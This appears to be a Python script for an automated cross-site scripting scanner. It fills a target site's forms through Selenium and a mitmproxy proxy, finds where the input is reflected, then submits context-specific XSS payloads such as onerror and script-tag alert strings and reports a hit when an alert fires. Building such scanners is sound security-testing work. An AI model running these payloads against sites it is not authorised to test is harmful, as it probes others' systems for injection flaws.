import random
import string
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
from selenium.common.exceptions import UnexpectedAlertPresentException
from bs4 import BeautifulSoup

# proxy information so mitmproxy can intercept the requests
proxy_host = "127.0.0.1"
proxy_port = 8080
url = sys.argv[1]
proxy = f"{proxy_host}:{proxy_port}"
options = webdriver.FirefoxOptions()
options.add_argument(f'--proxy-server={proxy}')
# launch Firefox with the configured proxy
driver = webdriver.Firefox(options=options)


def initial_form():
    # declaring variable that will be returned
    ran_input = []
    # try, except prevents code from crashing due to not finding the element and raising no such element exception
    try:
        # look for text and email inputs and textarea
        if driver.find_element(By.XPATH, "//input[@type='text']"):
            text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
            for text_input in text_inputs:
                # check if it has a pattern and is required
                if text_input.get_attribute('pattern'):
                    if text_input.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
            # otherwise generate random string and send keys
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_input.send_keys(ran)

        if driver.find_element(By.XPATH, '//textarea'):
            text_areas = driver.find_elements(By.XPATH, "//textarea")
            for text_area in text_areas:
                if text_area.get_attribute('pattern'):
                    if text_area.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_area.send_keys(ran)

        if driver.find_element(By.XPATH, "//input[@type='email']"):
            emails = driver.find_elements(By.XPATH, "//input[@type='email']")
            for email in emails:
                ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                ran_input.append(ran)
                email.send_keys(ran + "@gmail.com")
    except NoSuchElementException:
        pass

    # find and click button to submit form
    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return ran_input


def search_site(inputs):
    context = []
    # get page source to search for strings in html
    get_source = driver.page_source
    # getting the html in this method includes things that were added when the page loads which page source doesn't have
    page_source = driver.execute_script("return document.documentElement.outerHTML")

    for ran in inputs:
        soup = BeautifulSoup(page_source, 'html.parser')

        # Find all instances of the target string in the HTML
        instances = soup.find_all(string=lambda text: text and ran in text)
        if not instances:
            return None
        # add the context of each instance of the string to a list
        for instance in instances:
            parent_tags = [t.name for t in instance.parents]
            if instance.find_parent("script"):
                print(f"'{url}' is located within JavaScript.")
                context.append("javascript")
            elif any([tag is not None for tag in parent_tags]):
                print(f"'{url}' is located between HTML tags.")
                context.append("between")

            else:
                print(f"'{url}' is located within an HTML tag.")
                context.append("within")
        return context


def crawl_site(inputs):
    links = []
    already_visited = []
    found_endpoint = False
    while not found_endpoint:
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            #print(link.get_attribute("href"))
            if link.get_attribute("href") not in links and link.get_attribute("href") not in already_visited:
                print("adding to stack: " + link.get_attribute("href"))
                links.append(link.get_attribute("href"))
        if not links:
            return False
        next_page = links.pop()
        already_visited.append(next_page)
        driver.get(next_page)
        if search_site(inputs):
            return driver.current_url


def dtr_payload(context):
    if context == "between":
        betw_load = ["<img src=1 onerror=alert(1)>", "<script>alert(document.domain)</script>", "<><img src=1 onerror=alert(1)>"]
        return betw_load

    elif context == "within":
        in_load = ['" autofocus onfocus=alert(document.domain) x="', '"><script>alert(document.domain)</script>']
        return in_load
    else:
        java_load = ["</script><img src=1 onerror=alert(document.domain)>", "'-alert(document.domain)-'",
                     "';alert(document.domain)//", "\\';alert(document.domain)//", "onerror=alert;throw 1",
                     "&apos;-alert(document.domain)-&apos;", "${alert(document.domain)}", "javascript:alert(1)", "'-alert(1)-'", "${alert(1)}"
                     ]
        return java_load


def submit_form(payload):
    # sometimes the javascript popup doesn't get caught by is_script and only is triggered when trying to submit the next payload
    try:
        try:
            # look for text and email inputs and textarea
            if driver.find_element(By.XPATH, "//input[@type='text']"):
                text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
                for text_input in text_inputs:
                    # check if it has a pattern and is required
                    if text_input.get_attribute('pattern'):
                        if text_input.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                # otherwise submit the payload
                    else:
                        text_input.clear()
                        text_input.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, '//textarea'):
                text_areas = driver.find_elements(By.XPATH, "//textarea")
                for text_area in text_areas:
                    if text_area.get_attribute('pattern'):
                        if text_area.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                    else:
                        text_area.clear()
                        text_area.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, "//input[@type='email']"):
                emails = driver.find_elements(By.XPATH, "//input[@type='email']")
                for email in emails:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    email.clear()
                    email.send_keys(ran + "@gmail.com")
        except NoSuchElementException:
            pass
    except UnexpectedAlertPresentException:
        return False

    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return True


def script_check():
    try:
        if driver.switch_to.alert:
            return True
        else:
            return False
    except NoAlertPresentException:
        pass


# def start_mitm(filename):
#     #full_command = f"sudo mitmproxy -s {filename} --set url={url}"
#     mitmproxy_command = ["sudo", "mitmproxy", "-s", "mitmproxy_script.py", "--set", f"url={url}", "&"]
#     mitm_process = subprocess.run(mitmproxy_command, shell=True)
#     print("launching mitmproxy")
#     return mitm_process
#
#
# def stop_mitm(process):
#     process.terminate()


def read_file(rands):
    contexts = []
    with open("packets.txt") as f:
        print("file opened")
        contents = f.read()

        soup = BeautifulSoup(f, 'html.parser')
        for ran in rands:
            # Find all instances of the target string in the HTML
            instances = soup.find_all(string=lambda text: text and ran in text)
            if not instances:
                return None
            # Print the context of each instance of the target string
            for instance in instances:
                parent_tags = [t.name for t in instance.parents]
                if instance.find_parent("script"):
                    print(f"'{url}' is located within JavaScript.")
                    contexts.append("javascript")
                elif any([tag is not None for tag in parent_tags]):
                    print(f"'{url}' is located between HTML tags.")
                    contexts.append("between")

                else:
                    print(f"'{url}' is located within an HTML tag.")
                    contexts.append("within")
            return contexts


def test_payloads(contexts):
    is_script = False
    for context in contexts:
        # determine payload based on context
        use_payloads = dtr_payload(context)
        # loop through payloads until there are  either no more or xss is detected
        for use_payload in use_payloads:
            # submit form again with payload and break if there were any pop ups while trying to submit payload
            if not submit_form(use_payload):
                print("pop up detected while submitting payload")
                is_script = True
                return is_script
            # check for popup
            is_script = script_check()

            if is_script:
                print("xss vulnerability detected")
                return is_script
        if is_script:
            return is_script
    return is_script


if __name__ == "__main__":
    file = "scapyTest.py"
    driver.get(url)
    form = initial_form()
    contexts1 = search_site(form)
    contexts2 = read_file(form)
    if contexts1 or contexts2:
        if contexts1:
            test_payloads(contexts1)
        if contexts2:
            test_payloads(contexts2)
    else:
        exit_point = crawl_site(form)
        if exit_point:
            contexts1 = search_site(form)
            contexts2 = read_file(form)
            if contexts1 or contexts2:
                if contexts1:
                    test_payloads(contexts1)
                if contexts2:
                    test_payloads(contexts2)




